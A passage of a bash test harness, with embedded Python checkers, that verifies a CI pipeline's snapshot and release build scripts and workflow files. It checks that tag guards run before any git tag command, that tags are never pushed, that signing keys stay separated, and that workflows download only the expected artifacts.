  # the GUARD (advisor, Oct 9 night): outside GitHub Actions the script refuses BEFORE any git tag, so nothing is deleted on a developer's clone
  local v ok_all=yes
  for v in "" false FALSE TRUE 1 "true "; do
    mk "$d" "$kind" "$s" "$mode" "$SNAP_TAG"
    rc=$(run_stage "$d" "$kind" "$mode" "$SNAP_TAG" "GITHUB_ACTIONS=$v" "FAKE_TAGS_AT_HEAD=v0.3.0 keep-me"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" = 0 ] || ! grep -q 'outside GitHub Actions' "$d/stage.err" || grep -q 'git tag' <<< "$calls" || grep -q '^apk ' <<< "$calls" \
       || [ -e "$d/fake-tags.txt" ]; then      # the fake git creates the tag list on its first use: no file means git was never run
      ok_all=no
      bad "$ac $t $kind: GITHUB_ACTIONS='$v' -> rc=$rc, err: $(head -c 100 "$d/stage.err" 2> /dev/null), calls: $(tr '\n' '|' <<< "$calls" | cut -c1-120)"
    fi
  done
  if [ "$ok_all" = yes ]; then
    ok "$ac $t $kind: with GITHUB_ACTIONS unset, false, FALSE, TRUE, 1 or 'true ' the script exits non-zero naming the reason before any git tag"
  fi
  mk "$d" "$kind" "$s" "$mode" "$SNAP_TAG"
  rc=$(run_stage "$d" "$kind" "$mode" "$SNAP_TAG" "FAKE_TAGS_AT_HEAD=v0.3.0 keep-me"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" != 0 ] && grep -q 'keep-me' "$d/stage.err" && ! grep -q '^apk ' <<< "$calls" && ! grep -q 'git tag -d keep-me' <<< "$calls" \
     && ! grep -Eq 'git tag (--force )?v0.3.0|git (push|fetch)' <<< "$calls" \
     && grep -qx keep-me "$d/fake-tags.txt" && ! grep -qx v0.3.0 "$d/fake-tags.txt"; then
    ok "$ac $t $kind: a tag that is not a v* tag (keep-me) at HEAD fails the job naming it, before any build; it is not deleted and nothing is restored"
  else
    bad "$ac $t $kind: keep-me at HEAD -> rc=$rc, err: $(head -c 120 "$d/stage.err" 2> /dev/null), tags: $(tr '\n' ' ' < "$d/fake-tags.txt" 2> /dev/null)"
  fi
}
# guard_first FILE KIND: the apk scripts that delete tags must test GITHUB_ACTIONS on a line BEFORE their first `git tag` line (the other kinds have no tags)
guard_first() {
  local f=$1 kind=$2 guard first_tag
  case "$kind" in snapshot-apk|snapshot-rebuild-apk) ;; *) return 0;; esac
  guard=$(grep -n 'GITHUB_ACTIONS' "$f" | head -1 | cut -d: -f1); first_tag=$(grep -n 'git tag' "$f" | head -1 | cut -d: -f1)
  [ -n "$guard" ] && [ -n "$first_tag" ] && [ "$guard" -lt "$first_tag" ]
}
beh_snapshot_apk() { # beh_snapshot_apk TAGNAME SCRIPT MODE
  local t=$1 s=$2 mode=$3 d="$work/b-sapk-$1" rc calls
  REF_NAME=123/merge; mk "$d" snapshot-apk "$s" "$mode" "$SNAP_TAG"
  rc=$(run_stage "$d" snapshot-apk "$mode" "$SNAP_TAG"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  tagline=$(line_of 'git tag --force v0.0.0-rc.1 HEAD' "$d"); firstbuild=$(line_of '^apk ' "$d")
  if [ "$rc" = 0 ] && [ "$(n_calls 'git tag --force' "$d")" = 1 ] && [ -n "$tagline" ] && [ -n "$firstbuild" ] && [ "$tagline" -lt "$firstbuild" ] \
     && ! grep -q 'git push' "$d/calls.log"; then
    ok \
        "AC12 $t snapshot-apk: a LOCAL tag v0.0.0-rc.1 is made at HEAD before the first build (cache's driver wants the stamp v<version>); nothing is pushed"
  else
    bad "AC12 $t snapshot-apk: tag line $tagline, first build $firstbuild, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
  tag_cases snapshot-apk AC12 "$t" "$s" "$mode" "$d"
  mk "$d" snapshot-apk "$s" "$mode" "$SNAP_TAG"
  rc=$(run_stage "$d" snapshot-apk "$mode" "$SNAP_TAG" APK_RELEASE_SIGNING_KEY=SENTINEL-RELEASE-KEY)
  if [ "$rc" != 0 ] && [ ! -e "$d/out/items-apk.json" ]; then
    ok "AC12 $t snapshot-apk: a runner that holds the release signing key makes cache's driver refuse (exit 2): the stage never passes or uses it"
  else
    bad "AC12 $t snapshot-apk: release key in the environment -> rc=$rc"
  fi
  mk "$d" snapshot-apk "$s" "$mode" "$SNAP_TAG"; run_stage "$d" snapshot-apk "$mode" "$SNAP_TAG" > /dev/null
  if [ "$(head -1 "$d/out/$(uname -m)/$(oracle apkname standard "$SNAP_TAG")" 2> /dev/null)" = "SIG:assembly" ] \
     && [ "$(head -1 "$d/out/$(uname -m)/$(oracle apkname fips "$SNAP_TAG")" 2> /dev/null)" = "SIG:assembly" ] && ! grep -q -- '--signing-key' \
         "$d/calls.log";
     then
    ok "AC12 $t snapshot-apk: both snapshot apks are signed with the assembly key only (no --signing-key; Build never holds the release key)"
  else
    bad "AC12 $t snapshot-apk: the apks are not signed with the assembly key alone"
  fi
  mk "$d" snapshot-apk "$s" "$mode" "$SNAP_TAG"; rc=$(run_stage "$d" snapshot-apk "$mode" "$SNAP_TAG"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 0 ] && ! grep -q '^admit' <<< "$calls" && [ "$(n_calls '^version ' "$d")" = 0 ] && [ "$(n_calls '^apk ' "$d")" = 2 ] \
     && [ "$(n_calls "--version ${SNAP_TAG#v} " "$d")" = 2 ]; then
    ok "AC12 $t snapshot-apk: no admission and no version check, both variants build with --version ${SNAP_TAG#v} although the ref is a pull request's"
  else
    bad "AC12 $t snapshot-apk: exit $rc, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
  if [ ! -s "$d/gh.log" ]; then
    ok "AC12 $t snapshot-apk: the run makes ZERO gh calls (the admission's reads are unused in snapshot mode)"
  else
    bad "AC12 $t snapshot-apk: gh was called: $(head -c 120 "$d/gh.log")"
  fi
  if [ "$(n_calls 'SDE=1700000000' "$d")" = 2 ] && ! grep -q 'SDE=unset' "$d/calls.log"; then
    ok "AC12 $t snapshot-apk: SOURCE_DATE_EPOCH reaches both builds"
  else
    bad "AC12 $t snapshot-apk: SOURCE_DATE_EPOCH not exported to both builds"
  fi
  if [ "$(json_of "$d/out/items-apk.json")" = "$(oracle fragment "$(uname -m)" "$SNAP_TAG")" ]; then
    ok "AC12 $t snapshot-apk: out/items-apk.json is exactly the oracle's fragment"
  else
    bad "AC12 $t snapshot-apk: out/items-apk.json differs from the oracle"
  fi
  mk "$d" snapshot-apk "$s" "$mode" "$SNAP_TAG"
  rc=$(run_stage "$d" snapshot-apk "$mode" "$SNAP_TAG" FAKE_APK_RC=4)
  if [ "$rc" != 0 ] && [ ! -e "$d/out/items-apk.json" ]; then
    ok "AC12 $t snapshot-apk: a build that attempts the network (exit 4) fails the job and leaves no fragment"
  else
    bad "AC12 $t snapshot-apk: build exit 4 -> rc=$rc"
  fi
  REF_NAME=
}
beh_snapshot_assemble() { # beh_snapshot_assemble TAGNAME SCRIPT MODE
  local t=$1 s=$2 mode=$3 d="$work/b-sasm-$1" rc calls tampered
  REF_NAME=123/merge; mk "$d" snapshot-assemble "$s" "$mode" "$SNAP_TAG"
  rc=$(run_stage "$d" snapshot-assemble "$mode" "$SNAP_TAG"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 0 ] && ! grep -Eq '^verify (policy|verify|stage-start)' <<< "$calls" && [ "$(n_calls 'verify bind --local --step snapshot-apk' "$d")" = 2 ] \
     && [ "$(n_calls "--version ${SNAP_TAG#v} " "$d")" -ge 3 ]; then
    ok \
        "AC12 $t snapshot-assemble: no policy, no verify, no stage-start (a snapshot record is refused by them); both directories bound as snapshot-apk"
  else
    bad "AC12 $t snapshot-assemble: exit $rc, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-240)"
  fi
  if [ ! -s "$d/gh.log" ]; then
    ok "AC12 $t snapshot-assemble: the run makes ZERO gh calls"
  else
    bad "AC12 $t snapshot-assemble: gh was called: $(head -c 120 "$d/gh.log")"
  fi
  if [ "$(json_of "$d/digests.json")" = "$(oracle expect "$d" snapshot-assemble digests "$SNAP_TAG")" ] \
     && [ "$(json_of "$d/items.json")" = "$(oracle expect "$d" snapshot-assemble items "$SNAP_TAG")" ]; then
    ok "AC12 $t snapshot-assemble: digests.json and items.json are exactly the oracle's (the same files as a release writes)"
  else
    bad "AC12 $t snapshot-assemble: digests.json or items.json differs from the oracle"
  fi
  mk "$d" snapshot-assemble "$s" "$mode" "$SNAP_TAG"
  tampered=$(oracle apkname standard "$SNAP_TAG"); printf 'tampered' >> "$d/apk/ubuntu-24.04-arm/aarch64/$tampered"
  rc=$(run_stage "$d" snapshot-assemble "$mode" "$SNAP_TAG"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls" && [ ! -e "$d/digests.json" ]; then
    ok "AC12 $t snapshot-assemble: an apk whose bytes differ from the record stops the job before any image"
  else
    bad "AC12 $t snapshot-assemble: tampered apk -> rc=$rc"
  fi
  mk "$d" snapshot-assemble "$s" "$mode" "$SNAP_TAG"
  rc=$(run_stage "$d" snapshot-assemble "$mode" "$SNAP_TAG" FAKE_IMAGE_RC=4)
  if [ "$rc" != 0 ] && [ ! -e "$d/digests.json" ] && [ ! -e "$d/items.json" ]; then
    ok "AC12 $t snapshot-assemble: assemble-image.sh failing (exit 4) leaves no digests.json and no items.json"
  else
    bad "AC12 $t snapshot-assemble: assemble-image exit 4 -> rc=$rc"
  fi
  REF_NAME=
}
beh_snapshot_rebuild_apk() { # beh_snapshot_rebuild_apk TAGNAME SCRIPT MODE
  local t=$1 s=$2 mode=$3 d="$work/b-srba-$1" rc calls tagline firstbuild
  REF_NAME=123/merge; mk "$d" snapshot-rebuild-apk "$s" "$mode" "$SNAP_TAG"
  rc=$(run_stage "$d" snapshot-rebuild-apk "$mode" "$SNAP_TAG"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  tagline=$(line_of 'git tag --force v0.0.0-rc.1 HEAD' "$d"); firstbuild=$(line_of '^apk ' "$d")
  if [ "$rc" = 0 ] && [ -n "$tagline" ] && [ -n "$firstbuild" ] && [ "$tagline" -lt "$firstbuild" ] && ! grep -q 'git push' "$d/calls.log" \
     && ! grep -Eq '^verify (policy|verify|stage-start)|^admit' <<< "$calls" && [ "$(n_calls "--version ${SNAP_TAG#v} " "$d")" = 2 ]; then
    ok \
        "005-AC7 $t snapshot-rebuild-apk: the local v0.0.0-rc.1 tag, then both builds with --version ${SNAP_TAG#v}; no policy, stage-start, admission or push"
  else
    bad "005-AC7 $t snapshot-rebuild-apk: exit $rc, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
  if [ "$(json_of "$d/out/items-apk.json")" = "$(oracle fragment "$(uname -m)" "$SNAP_TAG")" ]; then
    ok "005-AC7 $t snapshot-rebuild-apk: out/items-apk.json is exactly the oracle's fragment"
  else
    bad "005-AC7 $t snapshot-rebuild-apk: out/items-apk.json differs from the oracle"
  fi
  if [ ! -s "$d/gh.log" ]; then ok "005-AC7 $t snapshot-rebuild-apk: ZERO gh calls"; else bad "005-AC7 $t snapshot-rebuild-apk: gh was called"; fi
  tag_cases snapshot-rebuild-apk 005-AC7 "$t" "$s" "$mode" "$d"
  REF_NAME=
}
beh_snapshot_rebuild_assemble() { # beh_snapshot_rebuild_assemble TAGNAME SCRIPT MODE
  local t=$1 s=$2 mode=$3 d="$work/b-srbs-$1" rc calls n1 n2 n3 n4
  REF_NAME=123/merge; mk "$d" snapshot-rebuild-assemble "$s" "$mode" "$SNAP_TAG"
  rc=$(run_stage "$d" snapshot-rebuild-assemble "$mode" "$SNAP_TAG"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  n1=$(line_of 'verify bind --local --step snapshot-rapk' "$d"); n2=$(line_of '^image ' "$d"); n3=$(line_of 'verify items-merge' "$d")
  n4=$(line_of 'verify rebuild-compare --snapshot --build-record witness-build/snapshot-build-collection.local.json' "$d")
  if [ "$rc" = 0 ] && [ -n "$n1" ] && [ -n "$n2" ] && [ -n "$n3" ] && [ -n "$n4" ] && [ "$n1" -lt "$n2" ] && [ "$n2" -lt "$n3" ] && [ "$n3" -lt "$n4" ] \
     && [ "$(n_calls 'verify bind --local --step snapshot-rapk' "$d")" = 2 ] && ! grep -Eq '^verify (policy|verify|stage-start)' <<< "$calls"; then
    ok \
        "005-AC7 $t snapshot-rebuild-assemble: bind (twice), images, merge, then the --snapshot compare with Build's snapshot-build record; no policy or verify"
  else
    bad "005-AC7 $t snapshot-rebuild-assemble: exit $rc, order $n1 $n2 $n3 $n4, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
  if [ "$rc" = 0 ] && jq -e '.verdict == "identical" and .items_differing == []' "$d/witness-rebuild/snapshot-verdict.json" > /dev/null 2>&1 \
     && [ ! -e "$d/witness-rebuild/verdict.json" ]; then
    ok "005-AC7 $t snapshot-rebuild-assemble: an identical rebuild writes witness-rebuild/snapshot-verdict.json (equal) and never a release verdict.json"
  else
    bad "005-AC7 $t snapshot-rebuild-assemble: rc=$rc files: $(ls "$d/witness-rebuild" 2> /dev/null | tr '\n' ' ')"
  fi
  if [ ! -s "$d/gh.log" ]; then ok "005-AC7 $t snapshot-rebuild-assemble: ZERO gh calls"; else bad "005-AC7 $t snapshot-rebuild-assemble: gh was called"; fi
  mk "$d" snapshot-rebuild-assemble "$s" "$mode" "$SNAP_TAG"
  python3 - "$d/build-in/items.json" <<'PY'
import json, sys
p = sys.argv[1]; items = json.load(open(p)); k = "image-fips"; items[k] = items[k][:-1] + ("0" if items[k][-1] != "0" else "1"); json.dump(items, open(p, "w"))
PY
  rc=$(run_stage "$d" snapshot-rebuild-assemble "$mode" "$SNAP_TAG")
  if [ "$rc" != 0 ] && jq -e '.verdict == "differs" and .images[1].equal == false and .items_differing == ["image-fips"]' \
        "$d/witness-rebuild/snapshot-verdict.json" > /dev/null 2>&1 \
     && grep -q 'image-fips' "$d/stage.err"; then
    ok "005-AC7 $t snapshot-rebuild-assemble: a differing Build item blocks the job and the snapshot verdict names it (rule 31 is not weakened)"
  else
    bad "005-AC7 $t snapshot-rebuild-assemble: differing item -> rc=$rc"
  fi
  REF_NAME=
}
snap_cases_of() { case "$1" in snapshot-apk) echo 11;; snapshot-assemble) echo 5;; snapshot-rebuild-apk) echo 6;; snapshot-rebuild-assemble) echo 4;; esac; }
for tag in fixture real; do
  mode=oracle; [ "$tag" = real ] && mode=real
  for kind in snapshot-apk snapshot-assemble snapshot-rebuild-apk snapshot-rebuild-assemble; do
    if [ ! -f "$(script_of "$tag" "$kind")" ]; then
      for _ in $(seq "$(snap_cases_of "$kind")");
      do bad "$(case "$kind" in snapshot-rebuild-*) echo 005-AC7;; *) echo AC12;; esac) $tag $kind: a behaviour case" \
             "(bin/build-stage-$kind.sh does not exist: RED until implemented)";
      done
      continue
    fi
    "beh_$(tr - _ <<< "$kind")" "$tag" "$(script_of "$tag" "$kind")" "$mode"
  done
done
for tag in fixture real; do
  for kind in snapshot-apk snapshot-assemble snapshot-rebuild-apk snapshot-rebuild-assemble; do
    f=$(script_of "$tag" "$kind")
    if [ ! -f "$f" ]; then
      bad "AC12 $tag bin/build-stage-$kind.sh never pushes a tag (the script does not exist: RED until implemented)"
    elif grep -Eq '(^|[^[:alnum:]_-])git[[:space:]]+(-[^[:space:]]+[[:space:]]+)*push|--push' "$f"; then
      bad "AC12 $tag bin/build-stage-$kind.sh names a git push (the snapshot tag is local and never pushed)"
    elif ! guard_first "$f" "$kind"; then
      bad "AC12 $tag bin/build-stage-$kind.sh: the GITHUB_ACTIONS guard does not come before the first git tag"
    elif grep -Eq '(^|[^[:alnum:]_.-])gh[[:space:]]|build-admit' "$f"; then
      bad "AC12 $tag bin/build-stage-$kind.sh names gh or the admission (snapshot mode makes no API read)"
    else
      ok "AC12 $tag bin/build-stage-$kind.sh never pushes a tag and never calls gh or the admission"
    fi
  done
done
cases_of() { case "$1" in apk) echo 16;; assemble) echo 21;; rebuild-apk) echo 3;; rebuild-assemble) echo 9;; esac; }    # cases one kind runs for both versions
for tag in fixture real; do
  mode=oracle; [ "$tag" = real ] && mode=real
  for kind in apk assemble rebuild-apk rebuild-assemble; do
    n=$(cases_of "$kind")
    if [ ! -f "$(script_of "$tag" "$kind")" ]; then      # a missing script is as many failed cases as the script would have run, so the total never shrinks
      for _ in $(seq "$n"); do bad "AC3 $tag $kind: a behaviour case (bin/build-stage-$kind.sh does not exist: RED until implemented)"; done
      continue
    fi
    before=$((pass + failn))
    for version in v0.3.0 v0.3.0-rc1; do "beh_$(tr - _ <<< "$kind")" "$tag" "$(script_of "$tag" "$kind")" "$mode" "$version"; done
    [ $((pass + failn - before)) = "$n" ] || bad "the $kind behaviour cases ran $((pass + failn - before)) cases, cases_of says $n"
  done
done
# Codex A r1 F6: the guard script judges the raw string, case-sensitively (an `if` in a workflow cannot: GitHub compares strings without regard to case)
GS="$root/bin/build-stage-refuse-mode.sh"
guard() { # guard WANT-EXIT LABEL [MODE]
  local rc=0; bash "$GS" "${@:3}" > /dev/null 2>&1 || rc=$?
  if [ "$rc" = "$1" ]; then ok "AC12 guard: $2"; else bad "AC12 guard: $2 (exit $rc, wanted $1)"; fi; }
guard 0 "release passes" release
guard 0 "snapshot passes" snapshot
guard 1 "Release (mixed case) is refused" Release
guard 1 "SNAPSHOT is refused" SNAPSHOT
guard 1 "releasE is refused" releasE
guard 1 "release with a trailing space is refused" "release "
guard 1 "an empty mode is refused" ""
guard 1 "no argument is refused"
# Codex A r1 F1: the snapshot callers consume only what Build uploads (images, dist, digests, items), the images are Build's OCI layout directories <variant>/ of production and fips
# (no debug variant: owner, Oct 9), and the checksum text is rebuilt from the digests.json output (Build has no checksums output)
cat > "$work/f1.py" <<'PY'
import re, sys, yaml
text = open(sys.argv[1]).read()
d = yaml.load(text, Loader=yaml.BaseLoader)
bad = []
own = {(s.get("with") or {}).get("name") for jn, j in (d.get("jobs") or {}).items() for s in (j.get("steps") or []) if jn == "vex-attach" and str(s.get("uses", "")).startswith("actions/upload-artifact@")} & {"vex-attach"}      # what the rescan's own vex-attach job uploads (the digests of its scratch attestations), nothing else
for jn, j in (d.get("jobs") or {}).items():
    for s in (j.get("steps") or []):
        w_ = s.get("with") or {}
        # the daily rescan's panel job downloads each scanner job's artifact by ARTIFACT ID (cache#602: one artifact can never stand for another); bin/panel-wiring-test.sh judges those four in full
        if str(s.get("uses", "")).startswith("actions/download-artifact@") and "artifact-ids" in w_:
            if jn != "panel" or not re.fullmatch(r"\$\{\{ needs\.panel-(grype|scout|inspector|google)\.outputs\.artifact-id \}\}", w_.get("artifact-ids", "")) or set(w_) != {"artifact-ids", "path"}:
                bad.append("%s downloads by artifact id %r, which only the panel job may do, and only a scanner job's own artifact" % (jn, w_.get("artifact-ids")))
            continue
        if str(s.get("uses", "")).startswith("actions/download-artifact@") and "pattern" not in (s.get("with") or {}) and (s.get("with") or {}).get("name") not in ("images", "dist", "digests", "items") + tuple(own):
            bad.append("%s downloads %r, which neither Build nor this workflow's own vex-attach job uploads" % (jn, (s.get("with") or {}).get("name")))
        if str(s.get("uses", "")).startswith("actions/download-artifact@") and (s.get("with") or {}).get("name") in own and jn != "panel-scout":
            bad.append("%s downloads %r, which only panel-scout may download" % (jn, (s.get("with") or {}).get("name")))
for gone in ("oci-candidate", "dist-snapshot", "outputs.checksums"):
    if gone in text: bad.append("still names %s" % gone)
if re.search(r"\bdebug\b", re.sub(r"(?m)^\s*#.*$", "", text)): bad.append("still names the debug variant")
# the tars a job may name: the three scan tars bin/layout-archive.sh builds under /tmp/arc/ in the job,
# each a whole double-quoted word with a space on both sides; any other spelling keeps its .tar and is caught
own_tars = text
for name in ("${tag}", "${v}-${arch}", "${v}-amd64"):
    for scheme in ("", "docker-archive:"):
        own_tars = own_tars.replace(' "' + scheme + "/tmp/arc/" + name + '.tar" ', " ")
if re.search(r"\.oci\b|\.tar\b(?!\.gz)|oci-archive:", re.sub(r"application/vnd\.oci\.(?:image\.(?:index|manifest|config)\.v1|empty\.v1)\+json(?![A-Za-z0-9._+-])", "", own_tars)): bad.append("still reads an archive file (Build's images artifact holds the OCI layout directory <variant>/: skopeo oci:/tmp/oci/<variant>)")
layout_read = r"\boci:/tmp/oci/\$\{v\}|\boci:%s|layout-archive\.sh \"/tmp/oci/\$\{v\}\""
if "/tmp/oci/" in text and not re.search(layout_read, text):
    bad.append("does not read the layout with skopeo oci: or bin/layout-archive.sh")
print("; ".join(bad) or "ok"); sys.exit(1 if bad else 0)
PY
f1() { # f1 ok|caught LABEL FILE [sed-expr]
  local f="$work/f1-$$.yml" out rc=0
  if [ -n "${4:-}" ]; then sed -e "$4" "$3" > "$f"; else cp "$3" "$f"; fi
  out=$(python3 "$work/f1.py" "$f") || rc=$?
  if { [ "$1" = ok ] && [ "$rc" = 0 ]; } || { [ "$1" = caught ] && [ "$rc" != 0 ]; }; then ok "AC14/F1 $2${out:+ ($out)}"; else bad "AC14/F1 $2 -> $out"; fi; }
for w in scan main-candidate-rescan; do f1 ok "the real $w.yml consumes only Build's artifacts, no debug, no .oci, no checksums output" "$root/.github/workflows/$w.yml"; done
f1 caught "an archive path that only looks like a media type (/tmp/oci/vnd.oci) is caught (take 30, Codex sol B4 and terra B1)" "$root/.github/workflows/main-candidate-rescan.yml" 's/name: images/name: images # tar -xf \/tmp\/oci\/vnd.oci/'
f1 caught "an archive path glued onto a media type (application/vnd.oci.x.tar) is caught (take 30 round 2, Codex terra)" "$root/.github/workflows/main-candidate-rescan.yml" 's/name: images/name: images # tar -xf \/tmp\/application\/vnd.oci.x.tar/'
f1 caught "an archive path glued onto a real media type (application/vnd.oci.image.manifest.v1.oci) is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's/name: images/name: images # tar -xf application\/vnd.oci.image.manifest.v1.oci/'
f1 caught "an archive path glued onto a real media type (application/vnd.oci.image.index.v1+json.tar) is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's/name: images/name: images # tar -xf application\/vnd.oci.image.index.v1+json.tar/'
f1 caught "a Build archive spelled as a tar of the layout (/tmp/oci/production.tar) is caught" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # tar -xf \/tmp\/oci\/production.tar/'
f1 ok "a scan tar the job builds itself under /tmp/arc/ is not a Build archive" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # grype "docker-archive:\/tmp\/arc\/${v}-amd64.tar" x/'
f1 caught "a Build archive nested so it ends in /tmp/arc/ (/tmp/oci/tmp/arc/production.tar) is caught" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # tar -xf \/tmp\/oci\/tmp\/arc\/production.tar/'
f1 caught "a Build archive reached from /tmp/arc/ by .. (/tmp/arc/../oci/production.tar) is caught" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # tar -xf \/tmp\/arc\/..\/oci\/production.tar/'
f1 caught "a variable prefix before /tmp/arc/ (\${ROOT}/tmp/arc/production.tar) is caught" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # tar -xf ${ROOT}\/tmp\/arc\/production.tar/'
f1 caught "a glob under /tmp/arc/ (/tmp/arc/*.tar) is not one of the job's own tar names" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # tar -xf \/tmp\/arc\/*.tar/'
f1 caught "a suffix after an own tar name (/tmp/arc/\${v}-amd64.tar.evil) is caught" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # tar -xf \/tmp\/arc\/${v}-amd64.tar.evil/'
f1 caught "a variable prefix before an own tar name (\${ROOT}/tmp/arc/\${v}-amd64.tar) is caught" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # tar -xf ${ROOT}\/tmp\/arc\/${v}-amd64.tar/'
f1 caught "a quoted own tar name with a word glued on (\"/tmp/arc/\${v}-amd64.tar\"evil) is caught" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # tar -xf "\/tmp\/arc\/${v}-amd64.tar"evil/'
f1 caught "an own tar name with a colon suffix (/tmp/arc/\${v}-amd64.tar:evil) is caught" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's/name: images/name: images # tar -xf \/tmp\/arc\/${v}-amd64.tar:evil/'
f1 caught "an archive file production.oci is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's/name: images/name: images # tar -xf production.oci/'
f1 caught "an old artifact name oci-candidate is caught" "$root/.github/workflows/scan.yml" 's/name: images/name: oci-candidate/'
f1 caught "the vex-attach artifact downloaded by a job other than panel-scout (here vex-attach itself) is caught" "$root/.github/workflows/main-candidate-rescan.yml" '1,/name: images/s/name: images/name: vex-attach/'
f1 caught "a download of vex-attach in a workflow whose own vex-attach job does not upload it (scan.yml) is caught" "$root/.github/workflows/scan.yml" 's/name: images/name: vex-attach/'
f1 caught "an old artifact name dist-snapshot is caught" "$root/.github/workflows/scan.yml" 's/name: dist$/name: dist-snapshot/'
f1 caught "needs.build.outputs.checksums is caught" "$root/.github/workflows/scan.yml" 's/needs.build.outputs.digests }}$/needs.build.outputs.checksums }}/'
f1 caught "the debug variant in a scan loop is caught" "$root/.github/workflows/scan.yml" 's/for v in production fips/for v in production debug fips/'
f1 caught "a <variant>.tar archive path is caught" \
  "$root/.github/workflows/main-candidate-rescan.yml" \
  's#layout-archive.sh "/tmp/oci/${v}"#layout-archive.sh "/tmp/oci/${v}.tar"#'
f1 caught "a download of an artifact Build never uploads is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's/name: images/name: oci-images/'
f1 caught "a panel download by artifact id of something that is not a scanner job's own artifact is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's/artifact-ids: ${{ needs.panel-grype.outputs.artifact-id }}/artifact-ids: ${{ needs.vex-attach.outputs.artifact-id }}/'
f1 caught "a download by artifact id outside the panel job is caught" "$root/.github/workflows/main-candidate-rescan.yml" '1,/name: images/s/name: images/artifact-ids: ${{ needs.panel-grype.outputs.artifact-id }}/'
f1 caught "a panel download by artifact id with a name beside it is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's#path: /tmp/panel/panel-scout#name: images#'
f1 caught "a panel download by artifact id with another key (run-id) in place of the path is caught" "$root/.github/workflows/main-candidate-rescan.yml" 's#path: /tmp/panel/panel-scout#run-id: 123#'
# Codex A r2 blocker 1 / B4: the release-candidate tag (vX.Y.Z-rcN, advisor 0383) runs the REAL `policy make` of bin/chain-verify.py in both assemble scripts (the
# harness no longer fakes it for an rc tag): the stage completes and the policy carries the FULL tag; a near-miss tag stops at the policy, before any build
for kind in assemble rebuild-assemble; do
  rd="$work/rcp-$kind"; mk "$rd" "$kind" "$root/bin/build-stage-$kind.sh" real v0.3.0-rc1; rc=$(run_stage "$rd" "$kind" real v0.3.0-rc1)
  if [ "$kind" = assemble ] && [ "$rc" = 0 ] && [ ! -e "$rd/policy.json" ]; then
    ok "AC12/rc $kind: the tag v0.3.0-rc1 completes with no policy (the apk records are local; the REAL admission-baseline reads the full tag)"
  elif [ "$kind" = rebuild-assemble ] && [ "$rc" = 0 ] && python3 -c 'import json,sys; p=json.load(open(sys.argv[1])); sys.exit(0 if p["tag"]=="v0.3.0-rc1" and p["ref"]=="refs/tags/v0.3.0-rc1" else 1)' "$rd/policy.json" 2> /dev/null; then
    ok "AC12/rc $kind: the tag v0.3.0-rc1 passes the REAL policy make and the policy carries the full tag"
  else bad "AC12/rc $kind: v0.3.0-rc1 through the real policy make: rc=$rc $(head -c 160 "$rd/stage.err" 2> /dev/null | tr '\n' ' ')"; fi
  for nm in v0.3.0-rc.1 v0.3.0-RC1 v0.3.0-rc1x; do
    rd="$work/rcn-$kind-$nm"; mk "$rd" "$kind" "$root/bin/build-stage-$kind.sh" real v0.3.0-rc1; rc=$(REF_NAME=$nm run_stage "$rd" "$kind" real v0.3.0-rc1)
    if [ "$rc" != 0 ] && [ "$(n_calls '^image ' "$rd")" = 0 ] && grep -q "refused at $([ "$kind" = assemble ] && echo 'build: tag' || echo policy)" "$rd/stage.err"; then ok "AC12/rc $kind: the near-miss tag $nm is refused at the real policy make, before any image is built"
    else bad "AC12/rc $kind: near-miss $nm: rc=$rc images=$(n_calls '^image ' "$rd") $(head -c 120 "$rd/stage.err" 2> /dev/null | tr '\n' ' ')"; fi
  done
done
# Release candidates (advisor 0383/0386, PR 4, REQ-CHAIN-007-AC14): PR 2 failed an rc tag closed with a job rc-refusal until Release's verify-and-stop existed.
# It exists now: the release job runs on an rc tag push (its `if` does not exclude rc, so release-verify runs) and ends after release-verify through the
# per-step condition of stage-promote.yml (bin/chain-release-wiring-test.sh); the rc-refusal job is gone, and the release job is the only publishing path.
cat > "$work/rcgate.py" <<'PY'
import sys, yaml
d = yaml.load(open(sys.argv[1]).read(), Loader=yaml.BaseLoader); jobs = d.get("jobs") or {}
bad = []
if "rc-refusal" in jobs: bad.append("an rc-refusal job is still there: Release's verify-and-stop replaces it (an rc tag must reach release-verify)")
c = str((jobs.get("release") or {}).get("if", "")).strip()
if "-rc" in c or "contains(" in c: bad.append("the release job's if excludes an rc tag (%r): release-verify would not run on it" % c)
if "!inputs.dry-run" not in c or "startsWith(github.ref, 'refs/tags/v')" not in c: bad.append("the release job's if lost the dry-run or the tag conjunct: %r" % c)
print("; ".join(bad) or "ok"); sys.exit(1 if bad else 0)
PY
rcg() { # rcg ok|caught LABEL [sed-expr]
  local f="$work/rcg-$$.yml" out rc=0
  if [ -n "${3:-}" ]; then sed -e "$3" "$root/.github/workflows/release.yml" > "$f"; else cp "$root/.github/workflows/release.yml" "$f"; fi
